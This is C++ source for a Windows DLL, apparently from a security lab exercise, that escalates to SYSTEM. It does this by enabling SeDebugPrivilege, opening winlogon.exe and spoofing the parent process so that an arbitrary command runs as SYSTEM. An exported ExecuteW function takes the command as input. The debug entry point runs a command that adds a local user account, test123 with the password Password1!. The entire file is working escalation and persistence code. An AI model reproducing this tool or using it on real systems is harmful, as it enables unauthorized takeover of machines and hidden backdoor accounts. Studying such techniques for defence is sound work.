#define no_init_all
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string>
#include <chrono>
#include <thread>
#include <strsafe.h>


// https://blog.xpnsec.com/becoming-system/
void EnableDebugPriv() {
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, false, &tkp, sizeof tkp, NULL, NULL);
	CloseHandle(hToken);
}

int findPidByName(const char* name)
{
	HANDLE h = NULL;
	PROCESSENTRY32 procSnapshot = { 0 };
	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (h == INVALID_HANDLE_VALUE)
		return -2;

	procSnapshot.dwSize = sizeof(PROCESSENTRY32);
	int pid = -1;

	do
	{
		if (lstrcmpiA(procSnapshot.szExeFile, name) == 0)
		{
			pid = (int)procSnapshot.th32ProcessID;
			break;
		}
	} while (Process32Next(h, &procSnapshot));

	CloseHandle(h);

	return pid;
}

BOOL getSystemPipe(LPCWSTR input, std::wstring* result)
{
	int pid;
	HANDLE pHandle = NULL;
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T size;
	BOOL ret;

	// Step1: update PID the static PID of winlogon.
	// Step2. compile and run and make sure you get a SYSTEM shell.
	// Step3. Update to use findPidByName("winlogon.exe") instead. We used this method during the injection lab.
	// Step4. Make the first arg to CreateProcessA NULL and set the second argument to "cmd /c " + input.c_str();
	// Set the PID to a SYSTEM process PID
	// ex: winlogon.exe, lsass.exe .. etc. 

	pid = findPidByName("winlogon.exe"); // UPDATE with PID of winlogon.exe



	EnableDebugPriv();

	// Open the process which we will inherit the handle from
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == 0) {
		//printf("Error opening PID %d\n", pid);
		return 2;
	}

	// Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);

	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	//CHAR input[] = "cmd /c notepad.exe";

	int bufferSize = wcslen(input) + 1; // +1 for the null-terminator

// Allocate memory on the heap for the output buffer
	CHAR* output = new CHAR[bufferSize];

	WideCharToMultiByte(CP_ACP, 0, input, -1, output, bufferSize, NULL, NULL);
	// Finally, create the process
	ret = CreateProcessA(
		NULL,
		output,
		NULL,
		NULL,
		true,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		reinterpret_cast<LPSTARTUPINFOA>(&si),
		&pi
	);

	delete[] output;

	if (ret == false) {
		//printf("Error creating new process (%d)\n", GetLastError());
		return 3;
	}
	*result = L"Pipe successful";
	return 1;
}


extern "C" __declspec(dllexport) LPWSTR ExecuteW(LPCWSTR lpUserdata, DWORD nUserdataLen)
{
	UNREFERENCED_PARAMETER(lpUserdata);
	UNREFERENCED_PARAMETER(nUserdataLen);

	LPWSTR result = NULL;
	HRESULT hr = E_FAIL;
	HANDLE hProcess = GetCurrentProcess();
	HANDLE hToken = NULL;

	OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
	if (hToken == NULL)
	{
		return NULL;
	}

	std::wstring wResult = L"";
	if (getSystemPipe(lpUserdata, &wResult))
	{
		if (wResult.size() > 0)
		{
			DWORD dwOutLen = (DWORD)wResult.length();
			DWORD dwResultLen = dwOutLen + 1;

			result = (LPWSTR)LocalAlloc(LPTR, dwResultLen * sizeof(WCHAR));
			if (result != NULL)
			{
				hr = StringCchCopyNW(result, dwResultLen, (LPWSTR)wResult.c_str(), dwOutLen);
			}
		}
	}
	
	return result;
}


#ifndef _DEBUG
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_THREAD_ATTACH:
	case DLL_PROCESS_ATTACH:
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
#endif

#if _DEBUG
int main()
{
	std::wstring out = L"";
	std::wstring input = L"cmd /c net user test123 Password1! /add";
	LPWSTR lpsz = ExecuteW((LPWSTR)input.c_str(), (DWORD)input.length());
	if (lpsz)
	{
		out = lpsz;
		LocalFree(lpsz);
		lpsz = NULL;

		if (out.size() > 0)
		{
			DWORD dwOutLen = (DWORD)out.length();
			DWORD dwResultLen = dwOutLen + 1;
			LPWSTR result = NULL;
			result = (LPWSTR)LocalAlloc(LPTR, dwResultLen * sizeof(WCHAR));
			if (result == NULL)
			{
				return -1;
			}
			HRESULT hr = StringCchCopyNW(result, dwResultLen, (LPWSTR)out.c_str(), dwOutLen);
			if (SUCCEEDED(hr))
			{
				//wprintf(L"%s\n", result);
			}

			LocalFree(result);
		}
	}
	return 0;
}
#endif
